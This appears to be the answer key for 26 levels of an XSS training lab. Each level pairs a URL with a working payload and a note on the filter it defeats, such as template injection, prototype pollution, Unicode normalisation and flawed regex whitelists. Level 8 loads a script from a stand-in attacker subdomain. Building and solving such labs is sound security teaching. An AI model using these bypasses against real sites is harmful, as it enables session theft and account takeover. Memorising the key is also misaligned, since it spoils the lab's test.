# modern-bypass — solutions

Modern real-world XSS bypasses: multi-step state, DOM clobbering config, Vue.js CSTI tag bypass, client prototype pollution, SVG direct load, iframe srcdoc, Unicode NFKC, flawed regex whitelists, and Shadow DOM (closed root + slot) sinks.

### modern-bypass-level1

`[POST] /modern-bypass/level1/save`
- body: `content=<script>alert(1)</script>`

`[GET] /modern-bypass/level1/preview?view=draft`
- payload: `<script>alert(1)</script>`
- context: Session-locked multi-step draft editor; save payload via POST first, then retrieve via GET with active cookie.

### modern-bypass-level2

`/modern-bypass/level2/?query=%3Ca%20id=config%20href=%22data:text/javascript,alert(1)%22%3E`

- payload: `<a id="config" href="data:text/javascript,alert(1)">`
- context: Standard tags/events stripped, but allowed anchor tag with custom id clobbers global `window.config` reference to load dynamic script.

### modern-bypass-level3

`/modern-bypass/level3/?query=%7B%7Bconstructor.constructor(%27alert(1)%27)()%7D%7D`

- payload: `{{constructor.constructor('alert(1)')()}}`
- context: Angle brackets `<` and `>` stripped completely, but evaluates directly inside Vue.js app container.

### modern-bypass-level4

`/modern-bypass/level4/#%7B%22__proto__%22:%7B%22scriptUrl%22:%22data:text/javascript,alert(1)%22%7D%7D`

- payload: `#{"__proto__":{"scriptUrl":"data:text/javascript,alert(1)"}}`
- context: Client-side recursive object merge does not block proto key, allowing global prototype pollution which is then read by dynamic script load.

### modern-bypass-level5

`/modern-bypass/level5/?svg=%3Csvg%20onload=alert(1)%3E`

- payload: `<svg onload=alert(1)>`
- context: Recursive case-insensitive `<script>` tag strip bypassed using raw element-level events on SVG under `image/svg+xml` content-type.

### modern-bypass-level6

`/modern-bypass/level6/?query=%3Cscript%3Ealert(1)%3C/script%3E`

- payload: `<script>alert(1)</script>`
- context: Input is HTML-escaped, but browser decodes entities within iframe `srcdoc` attribute before parsing it.

### modern-bypass-level7

`/modern-bypass/level7/?query=%EF%BC%9C%EF%BD%93%EF%BD%83%EF%BD%92%EF%BD%89%EF%BD%90%EF%BD%94%EF%BC%9E`

- payload: `＜ｓｃｒｉｐｔ＞`
- context: Strict keyword/event WAF bypassed using Unicode homoglyphs, which then normalize to standard tags via client-side `.normalize('NFKC')`.

### modern-bypass-level8

`/modern-bypass/level8/?callback_url=https://xssmaze.com.attacker.com/malicious.js`

- payload: `https://xssmaze.com.attacker.com/malicious.js`
- context: Flawed domain regex whitelist prefix check lacks proper anchors/slashes, allowing attacker subdomains starting with whitelist domain.

### modern-bypass-level9

`/modern-bypass/level9/?query=onload/onerror=alert(1)`

- payload: `onload/onerror=alert(1)`
- context: Unquoted image attribute context where all whitespace is stripped. Scanner must use `/` (slash) as an attribute separator instead of space.

### modern-bypass-level10

`/modern-bypass/level10/?query=%27%3E%3C/option%3E%3C/select%3E%3Csvg/onload=alert(1)%3E`

- payload: `'/></option></select><svg/onload=alert(1)>`
- context: Nested select/option single-quoted attribute breakout using a single quote.

### modern-bypass-level11

`/modern-bypass/level11/?query=alert(1)`

- payload: `alert(1)`
- context: Style block close tag blocked by WAF; payload reflected as a CSS custom variable value evaluated as plain JS by page script.

### modern-bypass-level12

`/modern-bypass/level12/?query=alert(1)`

- payload: `alert(1)`
- context: CSP restricts scripts but whitelists Google API CDN; bypassed by passing a JSONP script callback payload.

### modern-bypass-level13

`/modern-bypass/level13/?query=M%2010%2010%20xss:alert(1)`

- payload: `M 10 10 xss:alert(1)`
- context: Reflected inside SVG path attribute value; client-side JS custom SVG parser extracts `xss:` action and evaluates it.

### modern-bypass-level14

`/modern-bypass/level14/?query=%22%20onpointerover=alert(1)%20x=%22`

- payload: `" onpointerover=alert(1) x="`
- context: Standard event handlers (onload, onerror, etc.) blocked by strict event denylist; bypass requires obscure HTML5 events like `onpointerover`.

### modern-bypass-level15

`/modern-bypass/level15/?query=%27%20onerror=%27alert(1)`

- payload: `' onerror='alert(1)`
- context: Reflected inside single-quoted data-attribute JSON. Double quotes are escaped, but single quotes are not, allowing attribute breakout.

### modern-bypass-level16

`/modern-bypass/level16/?query=alert(1)`

- payload: `alert(1)`
- context: Double reflection. First is HTML-escaped inside a single-quoted JS string, but the second is unquoted raw JS.

### modern-bypass-level17

`/modern-bypass/level17/?query=%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E`

- payload: `<img src=x onerror=alert(1)>`
- context: No server-side reflection. Client-side JS reads `location.search` and injects the value into a **closed** ShadowRoot via `shadowRoot.innerHTML = '<div>Reflected: ' + input + '</div>';`.

### modern-bypass-level18

`/modern-bypass/level18/?query=%3Csvg%20onload%3Dalert(1)%3E`

- payload: `<svg onload=alert(1)>`
- context: Client-side JS writes the query value into the host's light DOM using `innerHTML`, while a **closed** ShadowRoot renders it via `<slot>`. Tools must execute JS and account for slotting into closed shadow trees.

### modern-bypass-level19

`/modern-bypass/level19/`
- payload: `postMessage({action:'execute',code:'alert(1)'},'*')` from an origin such as `https://xssmaze.com.attacker.com`
- context: client-only — the payload is a `postMessage`, so a request-only scanner
  cannot deliver it and a miss here is not a detection failure. The page validates
  the sender with `/https:\/\/xssmaze.com/.test(event.origin)`, an **unanchored**
  RegExp: it asks whether the origin *contains* `https://xssmaze.com`, not whether
  it equals it. `https://xssmaze.com.attacker.com` therefore passes, and
  `data.code` reaches `eval`. Frame the page, post from a matching origin, done.

### modern-bypass-level20

`/modern-bypass/level20/?query=%253Cscript%253Ealert(1)%253C/script%253E`
- payload: `%3Cscript%3Ealert(1)%3C/script%3E`
- context: First-level WAF checking for tags `<` or `>` passes because input is url-encoded twice. The application then performs an explicit second URL-decode (`URI.decode_www_form`) rendering the raw script tag.

### modern-bypass-level21

`/modern-bypass/level21/?query=%3C/script%3E%3Cscript%3Ealert(1)%3C/script%3E`
- payload: `</script><script>alert(1)</script>`
- context: Serialized raw as JSON into an inline script block. Since Crystal's `.to_json` doesn't escape script tags, an attacker injects a closing script tag to terminate the block and open a new one.

### modern-bypass-level22

`/modern-bypass/level22/?query=x-init=alert(1)`
- payload: `x-init=alert(1)`
- context: Attribute injection context with quote escaping. Attacker injects the Alpine.js framework attribute `x-init=alert(1)` to trigger code execution on page initialization without needing single or double quotes.

### modern-bypass-level23

`/modern-bypass/level23/?query=%3Cscript%3Ealert(1)%3C/script%3E`
- payload: `<script>alert(1)</script>`
- context: Meta CSP Pre-Execution Race condition. The query is reflected before the `<meta http-equiv="Content-Security-Policy" ...>` tag is parsed. The browser executes the injected script immediately before compiling and enforcing the CSP policy.

### modern-bypass-level24

`/modern-bypass/level24/?query=%7B%7Bconstructor.constructor(%27alert(1)%27)%28%29%7D%7D`
- payload: `{{constructor.constructor('alert(1)')()}}`
- context: Client-Side Template Injection (CSTI) under strict WAF. Backend WAF strips `<` and `>`, but the expression is evaluated as plain JavaScript inside the AngularJS framework container on the client-side.

### modern-bypass-level25

`/modern-bypass/level25/?query=%24%7Balert(1)%7D`
- payload: `${alert(1)}`
- context: ES6 JS Template Literal Injection. Reflection lands inside backtick-enclosed template string context. Although single/double quotes are escaped, attacker injects `${alert(1)}` placeholder dynamically executed by the browser engine.

### modern-bypass-level26

`/modern-bypass/level26/?config%5B__proto__%5D%5BscriptUrl%5D=data%3Atext%2Fjavascript%2Calert%281%29`
- payload: `?config[__proto__][scriptUrl]=data:text/javascript,alert(1)`
- context: Client-side recursive query parsing allows parameters to pollute `Object.prototype.scriptUrl`, triggering dynamic XSS when config loads.


